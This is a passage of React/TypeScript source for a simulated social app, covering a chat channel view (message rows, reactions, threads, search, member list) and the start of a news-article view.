        {!isDm && <button aria-label="Members" onClick={(e) => { e.stopPropagation(); onMembers(); }} className="grid size-10 place-items-center rounded-full text-muted hover:bg-surface-2"><Users className="size-[19px]" /></button>}
      </header>
      <VoiceBar s={s} srv={srv} now={now} />

      <div ref={scroller} role="log" aria-live="polite" aria-label={`Messages in ${title}`}
        onScroll={(e) => { const el = e.currentTarget; const up = el.scrollHeight - el.scrollTop - el.clientHeight > 140; stick.current = !up; if (up !== scrolledUp) { setScrolledUp(up); if (up) setSeenCount(msgs.length); } }}
        className="flex-1 overflow-y-auto overscroll-contain px-2 pb-2 pt-3 md:px-4">
        {msgs.length < 160 && !jump && (
          <div className="mb-4 px-2 pt-6">
            <div className="grid size-14 place-items-center rounded-full bg-surface-3 text-[26px]">{isDm ? <Avatar src={peer!.avatar} size={56} /> : <Hash className="size-7" />}</div>
            <h3 className="mt-2 text-[22px] font-black">{isDm ? title : `Welcome to #${ch.name}`}</h3>
            <p className="text-[13px] text-muted">{isDm ? (withGod ? `This is the beginning of your DMs with @${peer!.handle}.` : "Everything said here, God sees.") : `This is the start of #${ch.name}. ${ch.topic}`}</p>
          </div>
        )}
        {msgs.map((m, i) => {
          const prev = msgs[i - 1];
          const showNew = m.t > readMark && (!prev || prev.t <= readMark) && i > 0 && m.authorId !== "god";
          const parent = m.replyTo ? findMsg(s, m.replyTo) : undefined;
          const rx = reactionsAt(m, now);
          const txt = textAt(m, now);
          const grouped = !!prev && !showNew && prev.authorId === m.authorId && m.t - prev.t < 5 * 60e3 && !m.replyTo && prev.kind === m.kind && dayOnly(prev.t, now) === dayOnly(m.t, now);
          const newDay = !prev || dayOnly(prev.t, now) !== dayOnly(m.t, now);
          return (
            <Row key={m.id} s={s} srv={srv} m={m} text={txt} edited={isEdited(m, now)} rx={rx} rxSig={rx.map((r) => `${r.emoji}${r.count}${r.me ? "*" : ""}`).join("")}
              parent={parent} parentText={parent ? textAt(parent, now) : undefined} grouped={grouped} dayLabel={newDay ? dayOnly(m.t, now) : undefined} showNew={showNew}
              fresh={now - m.t < 6000} flash={jump === m.id} selected={sel === m.id} picker={picker === m.id} threadCount={threadCounts.get(m.id) ?? 0} pinned={!!m.pinnedAt && m.pinnedAt <= now}
              canWrite={withGod && !ch.announce}
              onSelect={() => { haptic(4); setSel(sel === m.id ? undefined : m.id); setPicker(undefined); }}
              onReact={(e) => react(m.id, e)} onPicker={() => setPicker(picker === m.id ? undefined : m.id)}
              onReply={() => { setReply(m); setEditing(undefined); setSel(undefined); }}
              onEdit={() => startEdit(m)} onDelete={() => { doDelete(m.id); setSel(undefined); }} onPin={() => { doPin(m.id); setSel(undefined); }}
              onThread={() => setPanel({ thread: m.id })} />
          );
        })}
      </div>

      {(scrolledUp || jump) && (
        <button onClick={(e) => { e.stopPropagation(); toBottom(); }} className="pop absolute bottom-[92px] left-1/2 z-10 flex -translate-x-1/2 items-center gap-1.5 rounded-full border border-line bg-surface-3/95 px-3.5 py-2 text-[12px] font-semibold shadow-xl backdrop-blur">
          <ArrowDown className="size-3.5" /> {newBelow > 0 ? `${newBelow} new message${newBelow > 1 ? "s" : ""}` : "Jump to latest"}
        </button>
      )}

      <div className="h-5 px-4 text-[11.5px] text-muted" aria-live="polite">
        {typing.length > 0 && (
          <span className="flex items-center gap-1.5">
            <span className="typing-dots"><i /><i /><i /></span>
            <span className="truncate [&_b]:font-semibold [&_b]:text-fg/85">{typingLabel(typing)}</span>
          </span>
        )}
      </div>
      <div className="relative px-2.5 pb-2.5 md:px-4 md:pb-3" onClick={(e) => e.stopPropagation()}>
        {suggestions.length > 0 && (
          <div className="pop absolute inset-x-2.5 bottom-full mb-1 overflow-hidden rounded-2xl border border-line bg-surface shadow-2xl md:inset-x-4">
            {suggestions.map((c) => (
              <button key={c.id} onClick={() => setText(text.replace(/@([\w.]*)$/, `@${c.username} `))} className="flex min-h-[44px] w-full items-center gap-2.5 px-3 text-left hover:bg-surface-2">
                <Avatar src={who(s, c.id).avatar} size={26} /><span className="text-[14px] font-medium">{c.nicknames[srv.id] ?? c.displayName}</span><span className="text-[12px] text-muted">@{c.username}</span>
              </button>
            ))}
          </div>
        )}
        {(reply || editing) && (
          <div className="mb-1.5 flex items-center gap-2 rounded-xl bg-surface-3/70 px-3 py-1.5 text-[12px] text-muted">
            {editing ? <Pencil className="size-3.5 shrink-0" /> : <Reply className="size-3.5 shrink-0" />}
            <span className="truncate">{editing ? "Editing your message" : <>Replying to <b className="text-fg">{nickOf(s, reply!.authorId, srv)}</b> · {textAt(reply!, now)}</>}</span>
            <button aria-label="Cancel" className="ml-auto grid size-7 shrink-0 place-items-center rounded-full" onClick={() => { setReply(undefined); if (editing) { setEditing(undefined); setText(""); } }}><X className="size-3.5" /></button>
          </div>
        )}
        {withGod ? (
          <div className="flex items-center gap-2 rounded-full border border-line bg-surface-3 py-1.5 pl-4 pr-1.5 transition-colors focus-within:border-gold/50">
            <input value={text} disabled={ch.announce} aria-label={`Message ${isDm ? title : `#${ch.name}`}`} onChange={(e) => onType(e.target.value)} onFocus={() => { if (text.trim() && !isDm && !editing) doTyping(srv.id, ch.id); }}
              onKeyDown={(e) => { if (e.key === "Enter") send(); if (e.key === "Escape") { setReply(undefined); setEditing(undefined); } if (e.key === "ArrowUp" && !text) { const mine = [...msgs].reverse().find((m) => m.authorId === "god" && !m.deleted); if (mine) startEdit(mine); } }}
              placeholder={ch.announce ? "Only mods can post in announcements" : isDm ? `Message @${peer!.handle}` : `Message #${ch.name}`} className="min-w-0 flex-1 bg-transparent py-1.5 text-[16px] outline-none placeholder:text-muted md:text-[14px]" />
            <button aria-label={editing ? "Save edit" : "Send"} onClick={send} disabled={!text.trim()} className={clsx("grid size-10 shrink-0 place-items-center rounded-full transition-all", text.trim() ? "bg-gold text-[#1a1406] active:scale-90" : "text-muted")}><Send className="size-[17px]" /></button>
          </div>
        ) : <div className="rounded-full border border-line bg-surface-3/60 px-4 py-2.5 text-center text-[13px] text-muted">You&apos;re reading someone else&apos;s DMs. They can&apos;t see you.</div>}
      </div>

      {panel === "search" && <SearchPanel s={s} srv={srv} ch={ch} now={now} onClose={() => setPanel(undefined)} />}
      {panel === "pins" && <SidePanel title={`Pinned in #${ch.name}`} onClose={() => setPanel(undefined)}>
        {pins.length ? pins.map((m) => <MiniMsg key={m.id} s={s} srv={srv} m={m} now={now} onClick={() => { setPanel(undefined); go(`/lounge/${srv.id}/${ch.id}?m=${m.id}`); }} />) : <p className="p-4 text-[13px] text-muted">Nothing pinned yet. Mods pin the moments people want to keep.</p>}
      </SidePanel>}
      {thread && <ThreadPanel s={s} srv={srv} root={thread} now={now} onClose={() => setPanel(undefined)} />}
    </section>
  );
}

/* --------------------------------- rows -------------------------------- */

interface RowProps {
  s: WorldState; srv: Server; m: Message; text: string; edited: boolean; rx: Reaction[]; rxSig: string; parent?: Message; parentText?: string; grouped: boolean; dayLabel?: string; showNew: boolean;
  fresh: boolean; flash: boolean; selected: boolean; picker: boolean; threadCount: number; pinned: boolean; canWrite: boolean;
  onSelect: () => void; onReact: (e: string) => void; onPicker: () => void; onReply: () => void; onEdit: () => void; onDelete: () => void; onPin: () => void; onThread: () => void;
}
const same = (a: RowProps, b: RowProps) => a.m === b.m && a.text === b.text && a.edited === b.edited && a.rxSig === b.rxSig && a.parentText === b.parentText && a.grouped === b.grouped && a.dayLabel === b.dayLabel && a.showNew === b.showNew && a.fresh === b.fresh && a.flash === b.flash && a.selected === b.selected && a.picker === b.picker && a.threadCount === b.threadCount && a.pinned === b.pinned && a.m.deleted === b.m.deleted;

const Row = memo(function Row({ s, srv, m, text, edited, rx, parent, parentText, grouped, dayLabel, showNew, fresh, flash, selected, picker, threadCount, pinned, canWrite, onSelect, onReact, onPicker, onReply, onEdit, onDelete, onPin, onThread }: RowProps) {
  const a = who(s, m.authorId);
  const nick = a.char?.nicknames[srv.id];
  const mine = m.authorId === "god";
  const pinged = !mine && (m.mentionsGod || /@god\b/i.test(text));
  const isSystem = m.kind === "system";
  const open = (e: React.MouseEvent) => { e.stopPropagation(); if (a.kind === "char") go(`/u/${a.id}`); };
  const pa = parent ? who(s, parent.authorId) : undefined;
  if (m.deleted) return null;
  if (m.intent === "voiceJoin") return (
    <div data-mid={m.id} data-testid="voice-banner" className={clsx("vc-banner my-2 rounded-xl px-3 py-2 text-center", fresh && "msg-in")}>
      <div className="flex items-center justify-center gap-2 text-[13px] font-semibold text-gold"><Mic className="size-4" />@god {text}</div>
      {rx.length > 0 && <div className="mt-1 flex flex-wrap justify-center gap-1">{rx.map((r) => <span key={r.emoji} className="num rounded-full bg-surface-3 px-2 py-0.5 text-[12px]">{r.emoji} {r.count}</span>)}</div>}
    </div>
  );
  return (
    <>
      {dayLabel && <div className="my-3 flex items-center gap-3 text-[11px] font-semibold text-muted"><div className="h-px flex-1 bg-line" /><span className="rounded-full bg-surface-3 px-2.5 py-0.5">{dayLabel}</span><div className="h-px flex-1 bg-line" /></div>}
      {showNew && <div className="my-2 flex items-center gap-2 text-[10.5px] font-bold uppercase tracking-wider text-down"><div className="h-px flex-1 bg-down/60" />New</div>}
      <div data-mid={m.id} data-author={m.authorId} data-reply-author={parent?.authorId} onClick={(e) => { e.stopPropagation(); onSelect(); }}
        onContextMenu={(e) => { e.preventDefault(); e.stopPropagation(); if (!selected) onSelect(); }}
        className={clsx("row-cv group relative cursor-default rounded-xl px-2 transition-colors md:hover:bg-surface-3/40", grouped ? "py-0.5" : "mt-2 py-1", fresh && "msg-in", flash && "flash-gold",
          pinged && "bg-gold/[0.07] shadow-[inset_3px_0_0_var(--gold)]", mine && "bg-gold/[0.04]", selected && "!bg-surface-3/70")}>
        {parent && pa && (
          <div className="mb-0.5 ml-[48px] flex items-center gap-1.5 truncate text-[12px] text-muted">
            <CornerUpLeft className="size-3 shrink-0 -scale-x-100" />
            <Avatar src={pa.avatar} size={14} />
            <span className={clsx("font-medium", pa.kind === "god" ? "text-gold" : "text-fg/80")}>{pa.char?.nicknames[srv.id] ?? pa.name}</span>
            <span className="truncate">{parent.deleted ? <i>message deleted</i> : parentText}</span>
          </div>
        )}
        <div className="flex gap-2.5">
          {grouped ? (
            <span className="w-[38px] shrink-0 pt-0.5 text-right text-[10px] text-muted opacity-0 md:group-hover:opacity-100">{clockTime(m.t)}</span>
          ) : (
            <button onClick={open} aria-label={`${a.name}'s profile`} className="shrink-0"><Avatar src={a.avatar} size={38} ring={mine ? "var(--gold)" : undefined} /></button>
          )}
          <div className="min-w-0 flex-1">
            {!grouped && (
              <div className="flex items-baseline gap-2">
                <button onClick={open} className="min-w-0 text-[14.5px] font-semibold" style={{ color: a.char && srv.moderators.includes(a.id) ? MOD : undefined }}><NameLine w={{ ...a, verified: mine }} nick={nick} /></button>
                <span className="num shrink-0 text-[11px] text-muted">{clockTime(m.t)}</span>
                {pinned && <Pin className="size-3 shrink-0 text-gold" aria-label="pinned" />}
              </div>
            )}
            <div className={clsx("whitespace-pre-wrap break-words text-[15px] leading-[1.42] md:text-[14.5px]", isSystem && "italic text-muted", m.kind === "bot" && "rounded-lg border border-line bg-surface-3/70 px-3 py-1.5 not-italic shadow-[inset_3px_0_0_var(--brand)]")}>
              <RichText text={text} onUser={(h) => { const c = s.characters.find((x) => x.username === h); if (c) go(`/u/${c.id}`); }} onTag={(t) => go(`/chirp/tag/${t}`)} />
              {edited && <span className="ml-1 text-[10.5px] text-muted">(edited)</span>}
            </div>
            {m.meme && <MemeImage m={m.meme} id={m.id} />}
            {threadCount > 0 && (
              <button onClick={(e) => { e.stopPropagation(); onThread(); }} className="mt-1 flex items-center gap-1.5 rounded-lg bg-surface-3/70 px-2.5 py-1 text-[12px] font-semibold text-brand hover:bg-surface-3"><MessageCircle className="size-3.5" />{threadCount} {threadCount === 1 ? "reply" : "replies"} in thread</button>
            )}
            {rx.length > 0 && (
              <div className="mt-1 flex flex-wrap gap-1">
                {rx.slice(0, 12).map((r) => (
                  <button key={r.emoji} aria-label={`${r.emoji} ${r.count}${r.me ? ", you reacted" : ""}`} aria-pressed={!!r.me} onClick={(e) => { e.stopPropagation(); onReact(r.emoji); }}
                    className={clsx("react-pop flex min-h-[28px] items-center gap-1 rounded-full border px-2 text-[12.5px] transition-colors active:scale-95", r.me ? "border-gold/70 bg-gold/15" : "border-line bg-surface-3/70 hover:border-fg/30")}>
                    {r.emoji} <span className={clsx("num", r.me ? "text-gold" : "text-muted")}>{r.count}</span>
                  </button>
                ))}
                {rx.length > 12 && <span className="self-center text-[11px] text-muted">+{rx.length - 12}</span>}
              </div>
            )}
            {selected && (
              <div onClick={(e) => e.stopPropagation()} className="pop mt-1.5 flex w-fit max-w-full flex-wrap items-center gap-0.5 rounded-2xl border border-line bg-surface p-1 shadow-xl">
                {QUICK.map((e) => <button key={e} aria-label={`React ${e}`} onClick={() => onReact(e)} className="grid size-9 place-items-center rounded-full text-[17px] hover:bg-surface-3 active:scale-90">{e}</button>)}
                <button aria-label="More reactions" onClick={onPicker} className="grid size-9 place-items-center rounded-full text-muted hover:bg-surface-3"><SmilePlus className="size-4" /></button>
                <span className="mx-0.5 h-5 w-px bg-line" />
                {canWrite && <ActBtn icon={Reply} label="Reply" onClick={onReply} />}
                {mine && canWrite && <ActBtn icon={Pencil} label="Edit" onClick={onEdit} />}
                {srv.id !== "dm" && <ActBtn icon={Pin} label={pinned ? "Unpin" : "Pin"} onClick={onPin} />}
                {mine && <ActBtn icon={Trash2} label="Delete" onClick={onDelete} danger />}
                {picker && (
                  <div className="grid w-full grid-cols-8 gap-0.5 border-t border-line pt-1 sm:grid-cols-10">
                    {PICKER.map((e) => <button key={e} aria-label={`React ${e}`} onClick={() => onReact(e)} className="grid size-9 place-items-center rounded-lg text-[18px] hover:bg-surface-3 active:scale-90">{e}</button>)}
                  </div>
                )}
              </div>
            )}
          </div>
          {!selected && <button aria-label="Message actions" onClick={(e) => { e.stopPropagation(); onSelect(); }} className="hidden self-start text-muted opacity-0 group-hover:opacity-100 md:block"><SmilePlus className="size-4" /></button>}
        </div>
      </div>
    </>
  );
}, same);

function ActBtn({ icon: I, label, onClick, danger }: { icon: typeof Reply; label: string; onClick: () => void; danger?: boolean }) {
  return <button onClick={onClick} className={clsx("flex min-h-9 items-center gap-1 rounded-full px-2.5 text-[12px] font-semibold hover:bg-surface-3", danger && "text-down")}><I className="size-3.5" /> {label}</button>;
}

function MiniMsg({ s, srv, m, now, onClick, hl }: { s: WorldState; srv: Server; m: Message; now: number; onClick?: () => void; hl?: string }) {
  const a = who(s, m.authorId);
  const t = textAt(m, now);
  let body: React.ReactNode = t;
  if (hl) { const i = t.toLowerCase().indexOf(hl.toLowerCase()); if (i >= 0) body = <>{t.slice(0, i)}<mark className="rounded bg-gold/30 px-0.5 text-fg">{t.slice(i, i + hl.length)}</mark>{t.slice(i + hl.length)}</>; }
  const chName = srv.channels.find((c) => c.id === m.channelId)?.name;
  return (
    <button onClick={onClick} className="flex w-full gap-2.5 rounded-xl p-2 text-left hover:bg-surface-2">
      <Avatar src={a.avatar} size={30} />
      <span className="min-w-0 flex-1">
        <span className="flex items-baseline gap-2 text-[13px]"><span className={clsx("truncate font-semibold", a.kind === "god" && "text-gold")}>{a.char?.nicknames[srv.id] ?? a.name}</span><span className="shrink-0 text-[10.5px] text-muted">{chName ? `#${chName} · ` : ""}{relTime(m.t, now)}</span></span>
        <span className="block break-words text-[13.5px] leading-snug">{body}</span>
      </span>
    </button>
  );
}

function SidePanel({ title, onClose, children }: { title: React.ReactNode; onClose: () => void; children: React.ReactNode }) {
  return (
    <div onClick={(e) => e.stopPropagation()} className="sheet-up absolute inset-0 z-30 flex flex-col bg-surface md:inset-y-0 md:left-auto md:right-0 md:w-[380px] md:border-l md:border-line md:shadow-[-12px_0_40px_rgba(0,0,0,0.35)]">
      <div className="flex h-[52px] shrink-0 items-center gap-2 border-b border-line px-3">
        <div className="min-w-0 flex-1 truncate text-[15px] font-bold">{title}</div>
        <button aria-label="Close panel" onClick={onClose} className="grid size-10 place-items-center rounded-full hover:bg-surface-2"><X className="size-5" /></button>
      </div>
      <div className="flex-1 overflow-y-auto p-2">{children}</div>
    </div>
  );
}

function SearchPanel({ s, srv, ch, now, onClose }: { s: WorldState; srv: Server; ch: Channel; now: number; onClose: () => void }) {
  const [q, setQ] = useState("");
  const [scope, setScope] = useState<"channel" | "server">("channel");
  const res = useMemo(() => {
    const k = q.trim().toLowerCase();
    if (k.length < 2) return [];
    const from = k.startsWith("from:") ? k.slice(5).split(" ")[0] : undefined;
    const word = from ? k.slice(5 + from.length).trim() : k;
    const out: Message[] = [];
    const all = [...s.messages, ...s.pending.filter((m) => m.t <= now)];
    for (let i = all.length - 1; i >= 0 && out.length < 80; i--) {
      const m = all[i];
      if (m.deleted || (scope === "channel" ? m.channelId !== ch.id : m.serverId !== srv.id)) continue;
      if (from) { const a = who(s, m.authorId); if (!a.handle.toLowerCase().startsWith(from) && !a.name.toLowerCase().startsWith(from)) continue; }
      if (word && !textAt(m, now).toLowerCase().includes(word)) continue;
      out.push(m);
    }
    return out;
  }, [q, scope, s, ch.id, srv.id, now]);
  const hl = q.trim().toLowerCase().startsWith("from:") ? q.trim().split(" ").slice(1).join(" ") : q.trim();
  return (
    <SidePanel title="Search" onClose={onClose}>
      <div className="sticky top-0 z-10 bg-surface pb-2">
        <div className="flex items-center gap-2 rounded-full border border-line bg-surface-3 px-3 focus-within:border-gold/50">
          <Search className="size-4 text-muted" />
          <input autoFocus value={q} onChange={(e) => setQ(e.target.value)} placeholder="Search messages, or from:username" aria-label="Search messages" className="min-w-0 flex-1 bg-transparent py-2.5 text-[16px] outline-none md:text-[14px]" />
        </div>
        {srv.id !== "dm" && <div className="mt-2 flex gap-1.5 text-[12px]">{(["channel", "server"] as const).map((x) => <button key={x} onClick={() => setScope(x)} className={clsx("min-h-8 rounded-full px-3", scope === x ? "bg-gold text-[#1a1406] font-semibold" : "bg-surface-3 text-muted")}>{x === "channel" ? `#${ch.name}` : `All of ${srv.name}`}</button>)}</div>}
      </div>
      {q.trim().length >= 2 && <div className="px-2 pb-1 text-[11px] text-muted">{res.length >= 80 ? "80+" : res.length} results</div>}
      {res.map((m) => <MiniMsg key={m.id} s={s} srv={srv} m={m} now={now} hl={hl} onClick={() => { onClose(); go(`/lounge/${srv.id}/${m.channelId}?m=${m.id}`); }} />)}
      {q.trim().length < 2 && <p className="p-3 text-[13px] text-muted">The whole history is searchable. Try <b>god</b>, <b>from:</b> a username, or a coin.</p>}
    </SidePanel>
  );
}

function ThreadPanel({ s, srv, root, now, onClose }: { s: WorldState; srv: Server; root: Message; now: number; onClose: () => void }) {
  const list = threadMessages(s, root.id, now);
  const typing = typingIn(s, root.channelId, now, root.id).map((id) => nickOf(s, id, srv));
  return (
    <SidePanel title={<span className="flex items-center gap-2"><MessageCircle className="size-4 text-brand" /> Thread</span>} onClose={onClose}>
      <MiniMsg s={s} srv={srv} m={root} now={now} />
      <div className="my-1 flex items-center gap-2 px-2 text-[11px] text-muted"><div className="h-px flex-1 bg-line" />{list.length} {list.length === 1 ? "reply" : "replies"}<div className="h-px flex-1 bg-line" /></div>
      {list.map((m) => <MiniMsg key={m.id} s={s} srv={srv} m={m} now={now} />)}
      {typing.length > 0 && <div className="flex items-center gap-1.5 px-3 py-2 text-[11.5px] text-muted"><span className="typing-dots"><i /><i /><i /></span><span className="[&_b]:font-semibold">{typingLabel(typing)}</span></div>}
    </SidePanel>
  );
}

/* ------------------------------- members ------------------------------- */

type WhoT = ReturnType<typeof who>;
const DOT: Record<Presence, string> = { online: "bg-up", idle: "bg-gold", offline: "bg-muted/50" };

function MemberItem({ x, srv, now, presence, typing }: { x: WhoT; srv: Server; now: number; presence: Presence; typing: boolean }) {
  const c = x.char!;
  const h = localHour(c, now);
  const mod = srv.moderators.includes(x.id);
  const badges = badgesFor(c, srv);
  const ob = OBSESSION_INFO[obsessionOf(c)];
  return (
    <div className={clsx("group flex w-full items-center gap-2 rounded-xl px-1.5 py-1 hover:bg-surface-2", presence === "offline" && "opacity-45")}>
      <button onClick={() => go(`/u/${x.id}`)} className="flex min-h-[44px] min-w-0 flex-1 items-center gap-2.5 text-left">
        <span className="relative shrink-0"><Avatar src={x.avatar} size={32} /><span className={clsx("absolute -bottom-0.5 -right-0.5 size-3 rounded-full border-2 border-surface", DOT[presence])} /></span>
        <span className="min-w-0">
          <span className="flex items-center gap-1" style={{ color: mod ? MOD : c.core ? "var(--gold)" : undefined }}><NameLine w={{ ...x, verified: false }} nick={c.nicknames[srv.id]} className="text-[13.5px]" /></span>
          <span className="flex items-center gap-1 truncate text-[10.5px] text-muted">
            {typing ? <span className="text-up">typing…</span> : presence === "offline" ? <span>{c.location}</span> : <span>{c.location} · {Math.floor(h)}:{String(Math.floor((h % 1) * 60)).padStart(2, "0")}</span>}
          </span>
          {badges.length > 0 && <span className="mt-0.5 flex flex-wrap gap-1">{badges.map((b) => <span key={b.label} className="rounded px-1 text-[9.5px] font-semibold leading-[15px]" style={{ background: b.color + "22", color: b.color }}>{b.label}</span>)}<span className="sr-only">{ob.label}</span></span>}
        </span>
      </button>
      <button aria-label={`Message ${c.displayName}`} onClick={() => go(`/lounge/dm/${dmChannel("god", x.id)}`)} className="grid size-9 shrink-0 place-items-center rounded-full text-muted opacity-100 hover:bg-surface-3 hover:text-fg md:opacity-0 md:group-hover:opacity-100"><MessageCircle className="size-4" /></button>
    </div>
  );
}

function MemberList({ s, srv, chId, now, open, onClose }: { s: WorldState; srv: Server; chId: string; now: number; open: boolean; onClose: () => void }) {
  const slot = Math.floor(now / 10_000);
  const groups = useMemo(() => {
    const seen = lastSeenMap(s, slot * 10_000, srv.id, 4000);
    const g: Record<Presence, { id: string; t: number; core: boolean; mod: boolean }[]> = { online: [], idle: [], offline: [] };
    for (const id of srv.members) {
      const c = s.characters[Number(id.slice(1))];
      g[presenceOf(c, seen.get(id), slot * 10_000)].push({ id, t: seen.get(id) ?? 0, core: !!c.core, mod: srv.moderators.includes(id) });
    }
    const sort = (a: { t: number; core: boolean; mod: boolean }, b: { t: number; core: boolean; mod: boolean }) => Number(b.mod) - Number(a.mod) || Number(b.core) - Number(a.core) || b.t - a.t;
    return { online: g.online.sort(sort), idle: g.idle.sort(sort), offline: g.offline.sort(sort) };
  }, [s, srv, slot]);
  const typing = new Set(typingIn(s, chId, now));
  const CAP: Record<Presence, number> = { online: 80, idle: 40, offline: 30 };
  return (
    <aside aria-label="Members" className={clsx("shrink-0 overflow-y-auto border-l border-line bg-surface p-2",
      "max-md:absolute max-md:inset-y-0 max-md:right-0 max-md:z-40 max-md:w-[min(86vw,320px)] max-md:shadow-[-8px_0_40px_rgba(0,0,0,0.5)] max-md:transition-transform max-md:duration-300 max-md:ease-[cubic-bezier(.2,.8,.2,1)]",
      open ? "max-md:translate-x-0" : "max-md:translate-x-[105%]",
      "md:w-[250px]", open ? "md:block" : "md:hidden xl:block")}>
      <div className="flex items-center justify-between px-2 pt-2">
        <div className="text-[14px] font-bold">Members <span className="num text-muted">{fmtCount(srv.memberCount)}</span></div>
        <button aria-label="Close members" className="grid size-9 place-items-center rounded-full bg-surface-3 md:hidden" onClick={onClose}><X className="size-4" /></button>
      </div>
      {(["online", "idle", "offline"] as const).map((p) => groups[p].length > 0 && (
        <div key={p}>
          <div className="flex items-center gap-1.5 px-2 pb-1 pt-4 text-[10.5px] font-semibold uppercase tracking-[0.14em] text-muted"><span className={clsx("size-2 rounded-full", DOT[p])} />{p} — {groups[p].length}</div>
          {groups[p].slice(0, CAP[p]).map((m) => <MemberItem key={m.id} x={who(s, m.id)} srv={srv} now={now} presence={p} typing={typing.has(m.id)} />)}
          {groups[p].length > CAP[p] && <div className="px-2 py-1 text-[11px] text-muted">and {groups[p].length - CAP[p]} more</div>}
        </div>
      ))}
      <div className="mt-3 flex items-center gap-1.5 px-2 pb-4 text-[10px] text-muted"><AtSign className="size-3" />{srv.members.length} regulars · {fmtCount(srv.memberCount)} total</div>
    </aside>
  );
}

```

## src/components/views/News.tsx
```tsx
"use client";
import clsx from "clsx";
import { useState } from "react";
import { ArrowLeft, Clock, Eye, Heart } from "lucide-react";
import type { Route } from "../App";
import { useApp } from "../store";
import { Avatar, NameLine, go, who } from "../ui";
import { clockTime, fmtCount, relTime } from "@/lib/sim/format";
import type { Article, WorldState } from "@/lib/sim/types";

const KIND: Record<string, string> = { breaking: "BREAKING", report: "Report", opinion: "Opinion", rumor: "Rumor mill", financial: "Markets", interview: "Interview", investigation: "Investigation" };

export function News({ route }: { route: Route }) {
  const { world: w, now } = useApp();
  const s = w!;
  const [outlet, setOutlet] = useState<string | null>(null);
  if (route.parts[0]) return <ArticleView s={s} id={route.parts[0]} now={now} />;
  const arts = s.articles.filter((a) => a.t <= now && (!outlet || a.outletId === outlet)).slice().reverse();
  const hero = arts.find((a) => a.kind === "breaking" && now - a.t < 6 * 3600e3) ?? arts[0];
  const rest = arts.filter((a) => a !== hero);
  return (
    <div className="h-full overflow-y-auto">
      <div className="mx-auto max-w-6xl p-3 md:p-6">
        <div className="mb-4 flex flex-wrap items-center gap-2">
          <h1 className="mr-2 text-[22px] font-black tracking-tight">Newsstand</h1>
          <button onClick={() => setOutlet(null)} className={clsx("rounded-full border px-3 py-1 text-[12px]", !outlet ? "border-fg text-fg" : "border-line text-muted")}>All</button>
          {s.outlets.map((o) => (
            <button key={o.id} onClick={() => setOutlet(o.id)} className={clsx("rounded-full border px-3 py-1 text-[12px] font-semibold", outlet === o.id ? "text-white" : "border-line text-muted")} style={outlet === o.id ? { background: o.color, borderColor: o.color } : undefined}>{o.name}</button>
          ))}
        </div>
        {hero && <Hero s={s} a={hero} now={now} />}
        <div className="mt-5 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          {rest.slice(0, 60).map((a) => <Card key={a.id} s={s} a={a} now={now} />)}
        </div>
      </div>
    </div>
  );
}

const outletOf = (s: WorldState, a: Article) => s.outlets.find((o) => o.id === a.outletId)!;
const cover = (a: Article, color: string) => `linear-gradient(135deg, ${color}, #050505 70%), radial-gradient(circle at 80% 20%, #ffffff22, transparent 40%)`;

function Hero({ s, a, now }: { s: WorldState; a: Article; now: number }) {
  const o = outletOf(s, a);
  return (
    <button onClick={() => go(`/news/${a.id}`)} className="panel group relative block w-full overflow-hidden text-left">
      <div className="h-56 md:h-72" style={{ background: cover(a, o.color) }} />
      <div className="absolute inset-0 flex flex-col justify-end bg-gradient-to-t from-black via-black/60 to-transparent p-5 md:p-8">
        <div className="mb-2 flex items-center gap-2 text-[12px]">
          {a.kind === "breaking" && <span className="breaking-pulse rounded bg-down px-2 py-0.5 font-bold text-white">BREAKING</span>}
          <span className="font-bold" style={{ color: o.color }}>{o.name}</span><span className="text-white/60">· {relTime(a.t, now)}</span>
        </div>
        <h2 className="max-w-3xl text-[24px] font-black leading-tight text-white group-hover:underline md:text-[34px]">{a.headline}</h2>
        <p className="mt-2 max-w-2xl text-[14px] text-white/75">{a.dek}</p>
      </div>
    </button>
  );
}

function Card({ s, a, now }: { s: WorldState; a: Article; now: number }) {
  const o = outletOf(s, a);
  return (
    <button onClick={() => go(`/news/${a.id}`)} className="panel group flex flex-col overflow-hidden text-left transition hover:-translate-y-0.5">
      <div className="h-28" style={{ background: cover(a, o.color) }} />
      <div className="flex flex-1 flex-col p-4">
        <div className="mb-1 flex items-center gap-2 text-[11px]"><span className="font-bold" style={{ color: o.color }}>{o.short}</span><span className="text-muted">{KIND[a.kind]}</span><span className="ml-auto text-muted">{relTime(a.t, now)}</span></div>
        <h3 className="font-bold leading-snug group-hover:underline">{a.headline}</h3>
        <p className="mt-1 line-clamp-2 text-[13px] text-muted">{a.dek}</p>
        <div className="mt-auto flex gap-3 pt-3 text-[11px] text-muted"><span className="flex items-center gap-1"><Eye className="size-3" />{fmtCount(a.reads)}</span><span>{a.comments.length} comments</span></div>
      </div>
    </button>
  );
}

function ArticleView({ s, id, now }: { s: WorldState; id: string; now: number }) {
  const a = s.articles.find((x) => x.id === id);
  if (!a) return <div className="p-8 text-muted">Article not found.</div>;
  const o = outletOf(s, a);
  const role = o.authors.find((x) => x.name === a.author)?.role;
  const comments = a.comments.filter((c) => c.t <= now);
  return (
    <div className="h-full overflow-y-auto">
      <div className="border-b border-line" style={{ background: `linear-gradient(90deg, ${o.color}33, transparent)` }}>
        <div className="mx-auto flex max-w-3xl items-center gap-3 px-4 py-3">
          <button onClick={() => go("/news")}><ArrowLeft className="size-5" /></button>
          <span className="text-[18px] font-black tracking-tight" style={{ color: o.color }}>{o.name}</span>
          <span className="hidden text-[12px] text-muted sm:inline">{o.tagline}</span>
        </div>
      </div>
      <article className="mx-auto max-w-3xl px-4 py-6 md:py-10">
        <div className="mb-3 flex items-center gap-2 text-[12px]">
          {a.kind === "breaking" ? <span className="breaking-pulse rounded bg-down px-2 py-0.5 font-bold text-white">BREAKING</span> : <span className="font-semibold uppercase tracking-wider" style={{ color: o.color }}>{KIND[a.kind]}</span>}
        </div>
        <h1 className="text-[30px] font-black leading-[1.1] tracking-tight md:text-[42px]">{a.headline}</h1>
        <p className="mt-3 text-[18px] text-muted">{a.dek}</p>
        <div className="mt-5 flex items-center gap-3 border-y border-line py-3 text-[13px]">
          <div className="grid size-9 place-items-center rounded-full text-[13px] font-bold text-white" style={{ background: o.color }}>{a.author.split(" ").map((x) => x[0]).join("")}</div>
          <div><div className="font-semibold">{a.author}</div><div className="text-[12px] text-muted">{role ?? "Staff"} · {o.name}</div></div>
